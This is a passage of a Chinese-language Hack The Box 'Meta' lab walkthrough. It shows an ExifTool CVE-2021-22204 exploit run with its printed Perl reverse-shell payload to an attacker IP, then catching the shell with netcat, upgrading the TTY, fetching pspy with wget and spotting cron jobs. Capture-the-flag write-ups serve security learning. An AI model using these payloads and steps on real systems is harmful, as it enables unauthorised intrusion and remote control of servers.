+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Exif Byte Order                 : Big-endian (Motorola, MM)<br>X Resolution                    : 72<br>Y Resolution                    : 72<br>Resolution Unit                 : inches<br>Y Cb Cr Positioning             : Centered<br>DjVu Version                    : 0.24<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Meta-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>15、看来漏洞是存在的，那我们就构造一个反弹shell的exp吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop/exploit-CVE-2021-22204-main]<br>└─$ sudo python exploit-CVE-2021-22204.py -s 10.10.14.4 443<br>[sudo] kali 的密码：<br><br>        _ __,~~~/_        __  ___  _______________  ___  ___<br>    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \<br>        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /<br>_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....<br>    <br>UNICORD: Exploit <span class="hljs-keyword">for</span> CVE-2021-22204 (ExifTool) - Arbitrary Code Execution<br>PAYLOAD: (metadata <span class="hljs-string">&quot;\c<span class="hljs-variable">$&#123;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));if(connect(S,sockaddr_in(443,inet_aton(&#x27;10.10.14.4&#x27;))))&#123;open(STDIN,&#x27;&gt;&amp;S&#x27;);open(STDOUT,&#x27;&gt;&amp;S&#x27;);open(STDERR,&#x27;&gt;&amp;S&#x27;);exec(&#x27;/bin/sh -i&#x27;);&#125;</span>;&#125;;&quot;</span>)<br>DEPENDS: Dependencies <span class="hljs-keyword">for</span> exploit are met!<br>PREPARE: Payload written to file!<br>PREPARE: Payload file compressed!<br>PREPARE: DjVu file created!<br>PREPARE: JPEG image created/processed!<br>PREPARE: Exiftool config written to file!<br>EXPLOIT: Payload injected into image!<br>CLEANUP: Old file artifacts deleted!<br>SUCCESS: Exploit image written to <span class="hljs-string">&quot;image.jpg&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>16、上传图片，获取下初始权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.11.140] 39632<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>17、设置下全交互式shell格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.11.140] 39634<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ script /dev/null -c bash</span><br><span class="hljs-string">Script started, file is /dev/null</span><br><span class="hljs-string">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z</span><br><span class="hljs-string">zsh: suspended  nc -lvnp 443</span><br><span class="hljs-string">                                                                                                 </span><br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$ stty raw -echo; fg</span><br><span class="hljs-string">[1]  + continued  nc -lvnp 443</span><br><span class="hljs-string">                              reset</span><br><span class="hljs-string">reset: unknown terminal type unknown</span><br><span class="hljs-string">Terminal type? screen</span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ </span><br></code></pre></td></tr></table></figure>
+
+<p>18、看下用户根目录下，是什么用户，是否可以直接查看user.txt内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ <span class="hljs-built_in">ls</span> -la /home/<br>total 12<br>drwxr-xr-x  3 root   root   4096 Aug 29  2021 .<br>drwxr-xr-x 18 root   root   4096 Aug 29  2021 ..<br>drwxr-xr-x  4 thomas thomas 4096 Jan 17  2022 thomas<br>www-data@meta:/var/www/dev01.artcorp.htb/metaview$ <span class="hljs-built_in">ls</span> -la /home/thomas/<br>total 32<br>drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 .<br>drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..<br>lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout<br>-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config<br>-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile<br>drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh<br>-rw-r----- 1 root   thomas   33 Jan 29 21:54 user.txt<br>www-data@meta:/var/www/dev01.artcorp.htb/metaview$ <br></code></pre></td></tr></table></figure>
+
+<p>19、由于这里是中级靶机，查看网站配置啥的，都是容易靶机的套路，这里上pspy看看进程有啥疑似问题没把</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/var/www/dev01.artcorp.htb/metaview$ <span class="hljs-built_in">cd</span> /tmp<br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span><br>www-data@meta:/tmp$<br>www-data@meta:/tmp$ <span class="hljs-built_in">uname</span> -a<br>Linux meta 4.19.0-17-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux</span><br>www-data@meta:/tmp$ <br><br>┌──(kali㉿offsec)-[~/Desktop/tools/pspy]<br>└─$ python3 -m http.server 80               <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.11.140 - - [30/Jan/2024 14:14:25] <span class="hljs-string">&quot;GET /pspy64 HTTP/1.1&quot;</span> 200 -<br><br>www-data@meta:/tmp$ wget http://10.10.14.4/pspy64<br>--2024-01-30 01:14:24--  http://10.10.14.4/pspy64<br>Connecting to 10.10.14.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3104768 (3.0M) [application/octet-stream]<br>Saving to: <span class="hljs-string">&#x27;pspy64&#x27;</span><br><br>pspy64              100%[===================&gt;]   2.96M   617KB/s    <span class="hljs-keyword">in</span> 5.7s    <br><br>2024-01-30 01:14:30 (533 KB/s) - <span class="hljs-string">&#x27;pspy64&#x27;</span> saved [3104768/3104768]<br><br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span><br>pspy64<br></code></pre></td></tr></table></figure>
+
+<p>20、接下来就是运行下，查看下进程情况吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/tmp$ <span class="hljs-built_in">chmod</span> +x pspy64 <br>www-data@meta:/tmp$ ./pspy64 <br>pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d<br><br><br>     ██▓███    ██████  ██▓███ ▓██   ██▓<br>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒<br>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░<br>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░<br>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░<br>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ <br>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ <br>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  <br>                   ░           ░ ░     <br>                               ░ ░     <br><br>Config: Printing events (colored=<span class="hljs-literal">true</span>): processes=<span class="hljs-literal">true</span> | file-system-events=<span class="hljs-literal">false</span> ||| Scanning <span class="hljs-keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)<br>Draining file system events due to startup...<br><span class="hljs-keyword">done</span><br>2024/01/30 01:15:27 CMD: UID=33    PID=4158   | ./pspy64 <br>2024/01/30 01:15:27 CMD: UID=0     PID=4066   | <br>2024/01/30 01:15:27 CMD: UID=33    PID=3965   | bash <br>2024/01/30 01:15:27 CMD: UID=33    PID=3964   | sh -c bash <br>2024/01/30 01:15:27 CMD: UID=33    PID=3963   | script /dev/null -c bash <br>2024/01/30 01:15:27 CMD: UID=33    PID=3961   | /bin/sh -i <br>2024/01/30 01:15:27 CMD: UID=33    PID=3960   | sh -c exiftool <span class="hljs-string">&#x27;/var/www/dev01.artcorp.htb/metaview/uploads/phphA3LxI.jpg&#x27;</span> --system:all --exiftool:all -e                                         <br>2024/01/30 01:15:27 CMD: UID=0     PID=3672   | <br>2024/01/30 01:15:27 CMD: UID=0     PID=3163   | <br>2024/01/30 01:15:27 CMD: UID=33    PID=2235   | /bin/bash <br>2024/01/30 01:15:27 CMD: UID=33    PID=2234   | python3 -c import pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>) <br>2024/01/30 01:15:27 CMD: UID=33    PID=2224   | /bin/sh -i <br>2024/01/30 01:15:27 CMD: UID=33    PID=2223   | sh -c exiftool <span class="hljs-string">&#x27;/var/www/dev01.artcorp.htb/metaview/uploads/php4CuAkX.jpg&#x27;</span> --system:all --exiftool:all -e                                         <br>2024/01/30 01:15:27 CMD: UID=33    PID=1746   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1716   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1715   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1707   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1692   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1571   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1539   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1469   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1466   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=33    PID=1254   | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=0     PID=622    | /usr/sbin/apache2 -k start <br>2024/01/30 01:15:27 CMD: UID=0     PID=613    | /usr/sbin/sshd -D <br>2024/01/30 01:15:27 CMD: UID=0     PID=603    | /sbin/agetty -o -p -- \u --noclear tty1 linux <br>2024/01/30 01:15:27 CMD: UID=0     PID=430    | /lib/systemd/systemd-logind <br>2024/01/30 01:15:27 CMD: UID=0     PID=429    | <br>2024/01/30 01:15:27 CMD: UID=0     PID=426    | /usr/sbin/rsyslogd -n -iNONE <br>2024/01/30 01:15:27 CMD: UID=104   PID=424    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                          <br>2024/01/30 01:15:27 CMD: UID=0     PID=419    | /usr/sbin/cron -f <br>2024/01/30 01:15:27 CMD: UID=0     PID=412    | /usr/bin/vmtoolsd <br>2024/01/30 01:15:27 CMD: UID=0     PID=403    | <br>2024/01/30 01:15:27 CMD: UID=0     PID=402    | <br>2024/01/30 01:15:27 CMD: UID=101   PID=392    | /lib/systemd/systemd-timesyncd <br>2024/01/30 01:15:27 CMD: UID=0     PID=391    | /usr/bin/VGAuthService <br>2024/01/30 01:15:27 CMD: UID=0     PID=364    | /lib/systemd/systemd-udevd <br>2024/01/30 01:15:27 CMD: UID=0     PID=362    | <br>2024/01/30 01:15:27 CMD: UID=0     PID=347    | /lib/systemd/systemd-journald <br>2024/01/30 01:15:27 CMD: UID=0     PID=313    | <br>2024/01/30 01:15:27 CMD: UID=0     PID=1      | /sbin/init <br>2024/01/30 01:15:27 CMD: UID=0     PID=4166   | <br>2024/01/30 01:16:01 CMD: UID=0     PID=4169   | /usr/sbin/CRON -f <br>2024/01/30 01:16:01 CMD: UID=0     PID=4168   | /usr/sbin/cron -f <br>2024/01/30 01:16:01 CMD: UID=0     PID=4167   | /usr/sbin/CRON -f <br>2024/01/30 01:16:02 CMD: UID=0     PID=4170   | /usr/sbin/CRON -f <br>2024/01/30 01:16:02 CMD: UID=0     PID=4171   | /usr/sbin/CRON -f <br>2024/01/30 01:16:02 CMD: UID=0     PID=4172   | /bin/sh -c <span class="hljs-built_in">rm</span> /tmp/* <br>2024/01/30 01:16:02 CMD: UID=0     PID=4174   | /usr/sbin/CRON -f <br>2024/01/30 01:16:02 CMD: UID=0     PID=4173   | <span class="hljs-built_in">cp</span> -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf                                                                  <br>2024/01/30 01:16:02 CMD: UID=1000  PID=4175   | /bin/bash /usr/local/bin/convert_images.sh <br>2024/01/30 01:16:02 CMD: UID=1000  PID=4176   | /bin/bash /usr/local/bin/convert_images.sh <br>2024/01/30 01:16:02 CMD: UID=1000  PID=4177   | /bin/bash /usr/local/bin/convert_images.sh <br>2024/01/30 01:17:01 CMD: UID=0     PID=4180   | /usr/sbin/CRON -f <br>2024/01/30 01:17:01 CMD: UID=0     PID=4179   | /usr/sbin/CRON -f <br>2024/01/30 01:17:01 CMD: UID=0     PID=4178   | /usr/sbin/cron -f <br>2024/01/30 01:17:01 CMD: UID=0     PID=4182   | /usr/sbin/CRON -f <br>2024/01/30 01:17:01 CMD: UID=1000  PID=4183   | /bin/sh -c /usr/local/bin/convert_images.sh <br>2024/01/30 01:17:01 CMD: UID=0     PID=4184   | /usr/sbin/CRON -f <br>2024/01/30 01:17:01 CMD: UID=0     PID=4185   | /usr/sbin/CRON -f <br>2024/01/30 01:17:01 CMD: UID=1000  PID=4186   | /bin/bash /usr/local/bin/convert_images.sh <br>2024/01/30 01:17:01 CMD: UID=0     PID=4188   | /bin/sh -c <span class="hljs-built_in">rm</span> /tmp/* <br>2024/01/30 01:17:01 CMD: UID=1000  PID=4187   | pkill mogrify <br>2024/01/30 01:17:01 CMD: UID=0     PID=4189   | /bin/sh -c    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly    <br></code></pre></td></tr></table></figure>
+
+<p>21、这里发现了几个脚本信息和配置信息，那就查看下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span 